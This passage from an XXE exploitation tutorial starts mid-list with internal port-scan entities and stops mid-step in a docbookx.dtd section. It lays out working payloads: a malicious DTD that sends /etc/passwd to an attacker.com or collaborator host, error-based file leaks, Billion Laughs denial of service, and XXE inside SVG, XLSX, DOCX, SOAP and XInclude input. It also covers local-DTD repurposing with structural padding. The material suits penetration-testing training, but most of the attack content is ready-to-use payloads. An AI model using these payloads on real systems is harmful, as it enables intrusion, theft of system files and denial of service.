<!ENTITY xxe SYSTEM "http://127.0.0.1:8443/">    <!-- Alt HTTPS -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:3306/">    <!-- MySQL -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:5432/">    <!-- PostgreSQL -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">    <!-- Redis -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:9200/">    <!-- Elasticsearch -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:27017/">   <!-- MongoDB -->

<!-- Scanning internal network hosts -->
<!ENTITY xxe SYSTEM "http://192.168.1.1/">
<!ENTITY xxe SYSTEM "http://10.0.0.1/">
<!ENTITY xxe SYSTEM "http://172.16.0.1/">
```

The parser behavior reveals information about the target: a connection refused error means the port is closed, a timeout suggests a firewall is filtering traffic, and actual content in the response confirms the service is running and accessible. Even when the response is not reflected directly, timing differences between open and closed ports can confirm which services are running.

## Out-of-Band (OOB) Exfiltration via Malicious DTDs

Up to this point, all techniques assume the server sends back the file content or error message in its response. But what happens when the application does not return anything useful? The response is a generic 200 OK or blank page, and nothing we inject shows up anywhere. This is called **blind XXE** — the vulnerability exists but we cannot see the output directly.

The solution is to make the server send the data somewhere else — to a server we control. This is the "out-of-band" part: instead of reading the data in the response, we receive it on a separate channel. The XML parser's ability to fetch external resources works in our favor here because we can make it send HTTP requests that contain the stolen data in the URL.

The core idea is simple:

- Host a **malicious DTD** on an attacker-controlled server.
- Reference this DTD from the vulnerable XML payload.
- Use parameter entities in the malicious DTD to read local files and send their contents via HTTP requests.

**Why parameter entities?** This is where parameter entities (covered in [XML Fundamentals](#what-are-parameter-entities)) become essential. We need to chain multiple operations: first read a file, then embed the file contents into a URL, then make the parser visit that URL. Regular entities cannot do this because they only work in the document body. Parameter entities work inside DTD declarations so we can define one entity that reads a file, then define another entity that uses the first entity's value inside a URL.

Think of it like a pipeline: `read file → put content in URL → send HTTP request`. Each step is a parameter entity that feeds into the next one.

### Understanding the Escape Characters

Before we look at the payload, there is one more concept to understand. When you define an entity inside another entity (which is what we need for chaining), the XML parser gets confused by the `%` character because it tries to resolve it immediately. To prevent this, we use **XML character references** — a way of writing special characters using their numeric code:

- `&#x25;` = `%` (the percent sign)
- `&#x26;` = `&` (the ampersand)
- `&#x27;` = `'` (single quote)

So when you see `&#x25;` in a payload, just read it as `%`. The parser will convert it back to `%` at the right moment during processing.

### Step 1: Create a Malicious DTD

On the attacker machine, create a DTD file containing the malicious actions. In this example, the content is designed to read `/etc/passwd`:

```XML
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<your-collaborator-id>.oastify.com/?x=%file;'>">
%eval;
%exfiltrate;
```

**Explanation:**

- `<!ENTITY % file SYSTEM "file:///etc/passwd">` tells the parser to load the contents of `/etc/passwd` into the entity `%file`.
- `<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<your-collaborator-id>.oastify.com/?x=%file;'>">` creates a new entity declaration inside `%eval`. The `&#x25;` is the escaped form of `%`, required because we are defining a parameter entity inside another entity.
- `%eval;` expands and defines `%exfiltrate`.
- `%exfiltrate;` triggers the HTTP request to the attacker's server, sending the file contents as part of the query string.

### Step 2: Host the Malicious DTD

Once the malicious DTD is created, host it on a server reachable by the target application. A simple Python HTTP server works:

```bash
python3 -m http.server 80
```

Ensure the server is publicly accessible or reachable from the target environment. If DNS resolution might fail, use an IP address instead of a domain name.

### Step 3: XML Payload to Send to the Affected Application

Send an XML payload that loads the external DTD:

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
  <!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd">
  %remote;
]>
<message>bar</message>
```

**Explanation:**

- `<!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd">` instructs the parser to fetch the malicious DTD.
- `%remote;` expands the content of the malicious DTD, executing the exfiltration logic.

**Tip:** Use an IP address if DNS resolution is unreliable. Ensure the protocol (HTTP/HTTPS) matches what the target can access.

### Step 4: Monitor OOB Interaction

Use Burp Collaborator or a custom HTTP listener to capture the incoming request. Burp Collaborator provides a unique domain that logs all interactions, making it easy to confirm exploitation. When the parser processes the malicious DTD, you should see an HTTP request to your Collaborator domain with the contents of `/etc/passwd` in the query string.

[What is a blind XXE attack? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/xxe/blind)

## Error-Based Blind XXE

OOB exfiltration requires the server to make outbound HTTP connections to our server. But what if the firewall blocks all outbound traffic? In that case, data cannot leave the network through HTTP requests. However, there is another channel we can use: **error messages**.

Many applications return error details when something goes wrong during XML parsing. If we can force the parser to include file contents inside an error message, we can read the data without any outbound connection. The trick is to make the parser try to access a non-existent file path that contains the stolen data. When the parser fails to open `file:///nonexistent/<contents of /etc/passwd>`, it generates an error message that includes the full path it tried to resolve — and that path contains the file contents we want.

For example, if the application returns error messages like these:

```json
{
  "REDACTED": "REDACTED",
  "errorMessage": "/etc/invalid-file (No such file or directory)"
}
```

```json
{
  "REDACTED": "REDACTED",
  "errorMessage": "/etc/shadow (Permission denied)"
}
```

This indicates that the XML parser is attempting to access the specified files and reporting filesystem errors. If we can trigger these errors, we can use them to **enumerate the filesystem** checking which files exist and which do not.

The simplest error-based payload references a non-existent file concatenated with the target file content:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/&#x25;file;'>">
  %eval;
  %error;
]>
<foo></foo>
```

When the parser expands `%error` it attempts to resolve the invalid path triggering an error message that includes the contents of `/etc/passwd`:

```
errorMessage: "/nonexistent/root:x:0:0:root:/root:/bin/bash"
```

##### ⚠️ A Note on Parser Strictness

While the payload above is logically correct, it often fails in modern production environments. This is because the W3C XML Specification forbids the expansion of parameter entities (like `%eval;`) within the internal DTD subset (the part inside the `[...]` brackets) if they are used to define other markup.

Many modern, spec-compliant parsers (like those in Java, .NET, or Libxml2) will throw an error as soon as they see %eval; used this way. If your payload is rejected with a `Parameter entity references are not allowed in internal DTD subsets` error, you will need to use other techniques (like **OOB exfiltration**) to successfully read the file contents.

### Bonus track

The same way we can read files by attaching their content to the error message, we can twist the payload a little bit to enumerate other internal services. Instead of defining `file:///etc/passwd` we can define connections to internal resources and read the responses from them (for example an admin dashboard hosted at <http://localhost:8080>):

```xml
<!ENTITY % file SYSTEM "http://localhost:8080/admin/dashboard">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/&#x25;file;'>">
%eval;
%error;
```

## Denial of Service

XML has a feature that allows expanding entities in a recursive way by referencing them in a loop. While this cannot be considered an external entity attack, it is worth mentioning due to the impact it may cause in the application. If the parser is not well configured those entities will keep being called until the application consumes its resources. The most famous resource exhaustion attack is the Billion Laughs DoS. While this attack is mostly mitigated in modern XML parsers, it provides very useful context on how XML works.

```XML
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE laugh [
    <!ELEMENT laugh ANY>
    <!ENTITY LOL "LOL">
    <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
    <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
    <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
]>
<laugh>&LOL3;</laugh>
```

The above payload makes the XML parser expand each of the entities, generating a large number of "LOLs". This payload would generate a significant number of "LOL" strings but a full scale payload would generate literally "Billions" of "LOL" strings.

Simpler variant (Quadratic Blowup):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY a "xxxxxxxxxxxxxxxx">
]>
<foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>
```

Both attacks cause memory exhaustion, CPU exhaustion, disk exhaustion (in some cases) and denial of service.

-----

# Intermediate Techniques

These techniques require specific context to work: a particular entry point (SOAP, file upload), a specific parser behavior (XInclude support) or a misconfiguration in content negotiation. They are not rare but they depend on the target environment.

## XXE via File Upload

Many file formats that look harmless actually use XML internally and if the server parses them with a vulnerable parser we can inject our payloads.

### SVG File Upload

SVG files are XML-based and are often processed by image handling libraries.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>
```

Save as `malicious.svg` and upload. If the application processes SVG files with a vulnerable XML parser, the entity may be reflected in rendered image metadata, server-side image generation output or error messages.

### XLSX (Excel) File Upload

XLSX files are ZIP archives containing XML files. The attack involves extracting, injecting and repackaging.

**Step 1:** Extract:

```bash
unzip document.xlsx -d xlsx_extracted/
```

**Step 2:** Inject into the XML files inside the archive. The most reliable injection point is `xl/workbook.xml` — this is the first file most parsers read to get the list of sheets, making it the most consistently triggered target. Other viable injection points are `xl/sharedStrings.xml` (shared string table used for cell values) and `xl/worksheets/sheet1.xml` (individual worksheet data). Here is an example injecting into `xl/workbook.xml`:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE workbook [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheets>
    <sheet name="&xxe;" sheetId="1" r:id="rId1"/>
  </sheets>
</workbook>
```

**Step 3:** Repackage. Use `zip -u` to update the existing archive in place rather than creating a new one — some Excel parsing libraries check the ZIP signature and will reject a file that was fully recreated:

```bash
cd xlsx_extracted
zip -u ../malicious.xlsx xl/workbook.xml
cd ..
```

**Step 4:** Upload and monitor.

### DOCX (Word Document) File Upload

DOCX files follow a similar structure (ZIP-based XML). The critical file is `word/document.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE document [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <w:body>
    <w:p>
      <w:r>
        <w:t>&xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
```

Same extraction/repackaging process as XLSX.

### General strategy

The approach is the same for all XML-based formats (SVG, XLSX, DOCX, ODS, ODP, XML, XHTML): include a basic entity, upload, check output. If output is not reflected use blind XXE. Some servers validate MIME types so you may need to craft polyglot files.

## XXE in SOAP

SOAP is built on XML and remains widely used in enterprise systems (financial, government, healthcare). Because SOAP messages are XML documents, SOAP endpoints are often treated as natural candidates for XXE testing. However, the important distinction is that XXE in SOAP is not really a SOAP feature — it is a consequence of how the underlying XML parser or SOAP framework handles untrusted XML.

In practice, XXE exploitability in SOAP depends on whether the framework accepts DTDs, whether external entities are enabled, and at what stage parsing happens relative to schema or message validation. This is why SOAP XXE is often highly implementation-dependent: two services using the same WSDL may behave very differently depending on the XML stack behind them.

A typical SOAP request:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
  </soap:Header>
  <soap:Body>
    <GetUser>
      <userId>123</userId>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

##### A Note on SOAP Conformance

There is one important caveat before moving into payloads: modern SOAP specifications do not treat DOCTYPE declarations as valid SOAP message content. In strict SOAP implementations, a message containing a DTD may be rejected before any entity resolution takes place.

That said, real-world systems do not always behave like strict specifications. Legacy SOAP stacks, permissive middleware, custom XML handlers and integrations that parse XML before SOAP-level validation may still process these payloads. For this reason, SOAP remains relevant during XXE testing even though the standard itself is restrictive.

### Injection in the SOAP Body

If entity expansion happens before the service validates the message structure, the SOAP body can act as an injection sink just like any other XML element:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
      <userId>&xxe;</userId>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

As with other XXE scenarios, success depends on the parser resolving the external entity before the application rejects the message for semantic reasons.

### Injection in the SOAP Header

The header is also parsed and can therefore become an injection point in implementations that process the full XML document before applying SOAP-specific validation:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <Authentication>
      <token>&xxe;</token>
    </Authentication>
  </soap:Header>
  <soap:Body>
    <GetUser>
      <userId>123</userId>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

In practice, header-based injection is useful when the application ignores the body content on malformed requests but still parses the envelope and header blocks first.

### SOAP Fault-Based Exfiltration

SOAP services often return structured fault messages when parsing fails. In environments where errors are exposed, this can provide a blind exfiltration channel in the same way as error-based XXE in regular XML endpoints:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/&#x25;file;'>">
  %eval;
  %error;
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
      <userId>test</userId>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```
If the parser attempts to resolve the invalid path, the resulting SOAP fault or backend error may include the expanded file contents.

##### ⚠️ A Note on Parser Strictness (again)

While the payload above is logically correct, it often fails in modern production environments. This is because the W3C XML Specification forbids the expansion of parameter entities (like `%eval;`) within the internal DTD subset (the part inside the `[...]` brackets) if they are used to define other markup.

Many modern, spec-compliant parsers (like those in Java, .NET, or Libxml2) will throw an error as soon as they see %eval; used this way. If your payload is rejected with a `Parameter entity references are not allowed in internal DTD subsets` error, you will need to use other techniques (like OOB exfiltration) to successfully read the file contents.

### WS-Addressing

Some SOAP services use WS-Addressing headers, which can provide another injection location if the full document is parsed before semantic validation:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:wsa="http://www.w3.org/2005/08/addressing">
  <soap:Header>
    <wsa:ReplyTo>
      <wsa:Address>&xxe;</wsa:Address>
    </wsa:ReplyTo>
  </soap:Header>
  <soap:Body>
    <GetUser>
      <userId>123</userId>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

This should be understood as an injection point, not as a WS-Addressing-specific XXE primitive. In other words, the risk still comes from insecure XML parsing, not from WS-Addressing itself. Also note that elements like wsa:Address are expected to contain URIs, so even if entity resolution occurs, the message may later fail SOAP or WS-Addressing validation. For that reason, WS-Addressing headers are best treated as context-dependent sinks rather than universally reliable XXE vectors.

#### Practical Takeaway

SOAP XXE is best approached as an implementation problem, not a protocol guarantee. The standard itself is restrictive, but real deployments often include legacy libraries, XML middleware, schema validators, security gateways and custom integrations that change how messages are parsed. From a testing perspective, this means SOAP remains worth checking — especially in enterprise environments — but success is far more dependent on the XML stack than on the SOAP envelope itself.

## XXE via XInclude

XInclude is an XML specification that allows including external XML documents without requiring a DOCTYPE declaration. This can bypass protections that specifically disable DOCTYPE processing.

XInclude uses `<xi:include>` to reference external files:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

The `parse="text"` attribute treats included content as plain text:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<document xmlns:xi="http://www.w3.org/2001/XInclude">
  <section>
    <title>System Information</title>
    <content>
      <xi:include href="file:///etc/hostname" parse="text"/>
    </content>
  </section>
</document>
```

The `parse="xml"` attribute (default) includes content as XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<document xmlns:xi="http://www.w3.org/2001/XInclude">
  <data>
    <xi:include href="file:///etc/xml/catalog" parse="xml"/>
  </data>
</document>
```

For OOB exfiltration:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<document xmlns:xi="http://www.w3.org/2001/XInclude">
  <data>
    <xi:include href="http://attacker.com/include.xml"/>
  </data>
</document>
```

XInclude also supports fallback elements when the primary include fails:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<document xmlns:xi="http://www.w3.org/2001/XInclude">
  <content>
    <xi:include href="file:///etc/passwd" parse="text">
      <xi:fallback>
        <e>File not accessible</e>
      </xi:fallback>
    </xi:include>
  </content>
</document>
```

## Content-Type Switching

Some APIs accept multiple content types and internally convert between formats. Many parsers don't validate the actual content against the declared content-type so we can try submitting XML payloads with different headers.

### JSON to XML

An API that accepts JSON may internally convert it to XML. We can try sending raw XML with a JSON content-type:

```http
POST /api/data HTTP/1.1
Host: example.com
Content-Type: application/json

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Testing strategy

APIs with poor input validation might accept `text/xml`, `application/xml`, `application/json`, `text/plain` or even missing content-types with XML content. Try the XXE payload with various content-type headers, with null/missing headers, and with charset parameters (`application/xml; charset=utf-8`).

## Handling Files with XML-Special Characters

When targeting files that contain special XML characters (`<`, `>`, `&`) direct entity inclusion fails because those characters break XML parsing. This is a common limitation when trying to read config files, HTML files or source code.

CDATA sections theoretically allow inclusion of raw content without XML interpretation, but entity expansion does not occur within CDATA sections — so wrapping the entity reference directly in CDATA does not work:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<foo><![CDATA[&xxe;]]></foo>
```

The entity `&xxe;` inside the CDATA block is treated as literal text, not resolved.

### Workaround: CDATA via External DTD

The correct way to use CDATA wrapping is to construct it dynamically using parameter entities in an external DTD. Because parameter entity chaining is allowed in external DTDs — unlike in the internal subset — we can build the CDATA wrapper around the file content before it reaches the document body:

Host this DTD on your attacker-controlled server:

```xml
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY content '%start;%file;%end;'>">
```

Then send this payload to the vulnerable application:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/cdata.dtd">
  %dtd;
  %all;
]>
<foo>&content;</foo>
```

When the parser loads the external DTD, `%all` defines the general entity `&content;` whose value is `<![CDATA[<file contents>]]>`. The CDATA wrapper prevents the parser from interpreting them as markup. This technique requires the parser to be able to reach your server — the same network condition as OOB exfiltration.

-----

# Advanced Techniques

These techniques require specific technology stacks, rare configurations or complex payload crafting. They are not the first thing to try but can be critical when standard techniques fail. This section also includes environment-specific escalation paths (like RCE through PHP expect:// or Java deserialization) which depend on very particular conditions in the target.

## Repurposing Local DTDs (Blind XXE)

When OOB connections are blocked and the application only returns errors, we can use pre-existing DTD files on the system to build our exfiltration chain without needing network access.

### Why Enumerate the Filesystem?

The goal of enumerating the filesystem is to locate **default DTD files** present on the system. These files can be leveraged to perform advanced XXE attacks because they often:

- Define **parameter entities** that can be overridden.
- Allow us to inject our own entities to manipulate output and include file contents indirectly.

### Identifying Injectable Parameter Entities in a DTD

Many system DTDs are publicly available for download. When you have access to the DTD file — either because it is distributed with a known package or available in its project repository — you can analyse it offline to find which parameter entities are safe to override.

There are two distinct types of injectable parameter entities, and they require different payload structures. Identifying which type you are dealing with is the first step before building a payload.

#### Declaration-Embedded Injection Points

A parameter entity is a declaration-embedded injection point when it is referenced inside a markup declaration (like `<!ELEMENT>` or `<!ATTLIST>`):

```xml
<!ELEMENT test (%expr;)*>
```

The key signal is that the parameter entity (in this case `%expr;`) appears as part of a content model or attribute list — inside the body of a markup declaration. When you override this entity, the replacement text is injected mid-declaration. You must craft the value to break out of that declaration cleanly and repair the DTD syntax that follows. 

#### Root-Level Injection Points

A parameter entity is a root-level injection point when it is referenced directly in the DTD body, outside any markup declaration:

```
<!ENTITY % ISOamso PUBLIC "..." "isoamso.ent">
%ISOamso;
```

The key signal is that the parameter entity (in this case `%ISOamso;`) appears as a standalone expansion call at the root of the DTD. When you override this entity, the replacement text is injected directly at root level — where the parser expects standalone DTD declarations. 

#### Identifying Candidates with grep

To find candidates quickly, run these two commands and cross-reference the output:

```bash
grep -n 'ENTITY %' target.dtd     # list all parameter entity definitions
grep -n '%[a-zA-Z][a-zA-Z0-9.]*;' target.dtd    # list all parameter entity references
```

For each entity that appears in both outputs, check the context of its reference:

- If it appears inside a markup declaration like `<!ELEMENT foo (%expr;)*>` → **declaration-embedded injection point**
- If it appears as a standalone call like `%ISOamso;` at the root of the DTD → **root-level injection point**

When a DTD offers both types, root-level injection points tend to produce simpler payloads, though both are equally valid paths to exploitation.

-----

### Common DTD Paths — Linux

```
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/yelp/dtd/docbookx.dtd
/usr/share/xml/xhtml/xhtml11-flat.dtd
/usr/share/xml/svg11/svg11-flat.dtd
/usr/share/sgml/docbook/ent/iso8879/ISOtech.ent
/etc/xml/catalog
/usr/local/etc/xml/catalog
```

### Common DTD Paths — Windows

Windows DTD paths depend on the software installed on the server. Unlike Linux where many DTDs ship with the base system packages, Windows DTDs come from specific applications (Java, Office, database engines, etc). Not all of these will be present — it depends on what is installed:

```
C:\Windows\System32\wbem\xml\cim20.dtd
C:\Windows\System32\wbem\xml\cim10.dtd
C:\Program Files\Common Files\Microsoft Shared\OFFICE16\Cultures\OFFICE.ODF
C:\Program Files (x86)\Common Files\Adobe\Acrobat\ActiveX\AcroIEHelper.dtd
C:\Program Files\Java\jdk*\lib\dtds\*.dtd
C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd
```

To check if a DTD exists we load it and check the parser response:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  %local_dtd;
]>
<message></message>
```

Error-based feedback indicates successful DTD loading. If we get a different error than “No such file or directory” or no error at all we know the file exists.

-----

### Exploitation Using fonts.dtd

`fonts.dtd` defines `%expr;`, which is referenced inside multiple `<!ELEMENT>` declarations — making it a declaration-embedded injection point. This requires structural padding to produce a syntactically valid payload.

- **Step 1:** Load the Local DTD:

```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  %local_dtd;
]>
<message></message>
```

- **Step 2:** Override Parameter Entities:
  `fonts.dtd` defines `%expr;` inside `<!ELEMENT>` declarations. We redefine it to break out of the enclosing declaration and inject our exfiltration chain. Note the `<!ELEMENT aa (bb'>` declaration at the end of the override — **this is the structural padding** that makes the payload syntactically valid when assembled with `fonts.dtd`. The mechanics behind it and how to derive equivalent padding for other DTDs are covered in [Dissecting the Structural Padding](#dissecting-the-structural-padding).

```xml
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % expr 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>%local_dtd;
]>
<message></message>
```

**Explanation:**

1. `%file` loads the contents of `/etc/passwd` from the local filesystem.
2. `%eval` creates a new parameter entity `%error` that references a non-existent file path concatenated with `%file` content.
3. When the parser expands `%error`, it attempts to resolve the invalid path, triggering an error message that includes the contents of `/etc/passwd`.
4. The structural padding `<!ELEMENT aa (bb'>` absorbs the remainder of the broken `<!ELEMENT>` declaration in `fonts.dtd`, keeping the assembled DTD syntactically valid.

- **Step 3:** Trigger Error-Based Exfiltration:
  If the application returns error messages, the response will include something like:

```
errorMessage: "/nonexistent/root:x:0:0:root:/root:/bin/bash"
```

### Dissecting the Structural Padding

> This subsection applies to declaration-embedded injection points only. Root-level injection points expand outside any markup declaration and do not require structural padding.

The structural padding — `<!ELEMENT aa (bb'>` — is not an arbitrary placeholder. Its exact form is derived from the DTD being exploited, and understanding why it looks the way it does is essential for adapting this technique to other DTDs.

#### The Entity Value and the Role of the Single Quote

Before dissecting the assembly, one detail must be clear: the single quote in `<!ELEMENT aa (bb'>` is **not** part of the injected content. It is the closing delimiter of the entity value in the override declaration:

```xml
<!ENTITY % expr '...<!ELEMENT aa (bb'>
```

What the parser expands when it encounters `%expr;` is everything between the two `'` delimiters, without them. The actual value injected into the DTD ends with `(bb`, not `(bb'`. This distinction is critical for understanding why the assembled declarations are syntactically valid.

#### The Injection Point in fonts.dtd

When analysing `fonts.dtd`, we are looking for the **first relevant use site** of `%expr;` after its declaration — the first markup declaration body where `%expr;` is referenced, because that is where the parser will expand our override. Scanning the DTD in order, the first relevant use site is:

```
<!ELEMENT test (%expr;)*>
```

This is the declaration our override breaks open. The following section traces exactly how the parser assembles the payload from that point.

#### How the Parser Assembles the Payload

The literal value of `%expr;` — exactly as it appears between the entity delimiters — is:

```
aaa)>
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    <!ELEMENT aa (bb
```

The following is a conceptual normalisation of this literal after character-reference decoding (`&#x25;` → `%`, `&#x26;` → `&`, `&#x27;` → `'`). It is not the final post-expansion state — `%eval;` and `%error;` are still unresolved references at this stage, declared but not yet expanded:

```
aaa)>
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
    <!ELEMENT aa (bb
```

The expansion of `%expr;` initiates a three-phase chain:

- **Phase 1 — `%expr;`** injects the above text into the DTD, including the declarations of `%file` and `%eval`.
- **Phase 2 — `%eval;`**, when expanded, produces the declaration of `%error`.
- **Phase 3 — `%error;`**, when expanded, attempts to resolve a URI that concatenates a non-existent path with the contents of `%file;`, triggering an error message that leaks the file contents.

When the parser expands `%expr;` inside the `test` declaration, the assembled DTD becomes:

```xml
<!ELEMENT test (aaa)>
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
<!ELEMENT aa (bb)*>
```

Three things happen here:

1. **`<!ELEMENT test (aaa)>`** — the `(` that precedes `%expr;` in the original declaration plus the `aaa)>` from our override produce `(aaa)` — a perfectly balanced, syntactically valid content model. The parser closes the `test` declaration and moves on.
2. **Exfiltration logic** — now sitting outside any enclosing declaration, the parser processes `%file` and `%eval` as independent DTD declarations, then drives the three-phase expansion chain that triggers the error-based exfiltration.
3. **`<!ELEMENT aa (bb)*>`** — the `<!ELEMENT aa (bb` from our padding combines with the remainder of the original `test` declaration (`)*>`) to form a new, syntactically valid element declaration. The `(` opened by the padding is closed by `)`, and `*` is applied as the quantifier. The parentheses are perfectly balanced. Without the padding, the parser would encounter `)*>` with no opening context and reject it as malformed.

#### Deriving the Padding for Other DTDs

When targeting a declaration-embedded injection point in a different DTD, the padding must be derived from the specific declaration that contains the entity reference. The process is:

1. **Find the injection point.** Scan the DTD in order and locate the **first relevant use site** of the target entity — the first markup declaration body where it is referenced after its definition. This is where the parser will expand your override and where the exfiltration logic will execute.
2. **Identify what precedes the entity reference in that declaration.** Count open parentheses and determine the minimum tokens needed to close them and terminate the declaration with `>`. This is the opening of your override value.
3. **Identify what follows the entity reference in that declaration.** This is the remainder your padding must absorb. Look for injection points where this remainder is minimal — ideally just a quantifier (`*`, `+`, or `?`) followed by `>`, leaving only `)*>`, `)+>`, or `)?>`  as the leftover. These produce clean, balanced assemblies.
4. **Construct the padding.** Open a new `<!ELEMENT name (placeholder` where `placeholder` is any valid XML name. Remember that the closing delimiter `'` of the entity value is not part of the injected content — the padding ends with `(placeholder`, and the remainder of the original declaration provides the closing `)`.
5. **Verify the assembled output is valid DTD.** Mentally substitute your override into the original declaration and check that every resulting `<!ELEMENT>` and `<!ENTITY>` is syntactically complete. Parentheses should balance cleanly. If they do not, choose a different injection point.
   
-----

### Exploitation Using docbookx.dtd

Both techniques exploit the same fundamental mechanism — overriding a parameter entity to inject the exfiltration chain into an external DTD context where parameter entity chaining is permitted. The difference is purely structural: with a root-level injection point the overridden entity expands outside any markup declaration, so no declaration needs breaking open and no padding is required.

`docbookx.dtd` defines a set of ISO character entity sets as parameter entities that are expanded directly at root level:

```
<!ENTITY % ISOamso PUBLIC "..." "isoamso.ent">
%ISOamso;
```

`%ISOamso;` is a root-level injection point. Overriding it injects the exfiltration logic directly into the DTD body as standalone declarations.

- **Step 1:** Load the Local DTD:

```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  %local_dtd;
]>
<message></message>
```

- **Step 2:** Override the Root-Level Entity:
  We redefine `%ISOamso;` with the exfiltration chain directly. No structural padding is needed — the replacement text is injected at root level where standalone DTD declarations are valid.
  
